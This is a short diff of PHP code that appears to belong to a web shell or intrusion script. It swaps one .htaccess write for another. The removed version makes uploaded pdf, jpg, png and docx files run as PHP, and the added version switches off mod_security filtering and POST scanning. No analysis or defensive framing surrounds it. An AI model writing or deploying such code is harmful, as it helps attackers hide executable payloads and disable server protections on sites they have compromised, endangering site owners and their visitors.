@@ -336,13 +336,10 @@ if (file_exists('php.ini')) {
     fclose($img);
 }
 if (!file_exists('.htaccess')) {
-    $htc = fopen('.htaccess', 'w');
-    $isian = '
-    <FilesMatch "\.(pdf|jpg|png|docx)$">
-    SetHandler application/x-httpd-php
-    </FilesMatch>';
-    fwrite($htc, $isian);
-    fclose($htc);
+    $ht = fopen('.htaccess', 'w');
+    $isian = "<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>";
+    fwrite($ht, $isian);
+    fclose($ht);
 }
 function w($dir, $perm) {
 if (!is_writable($dir)) {
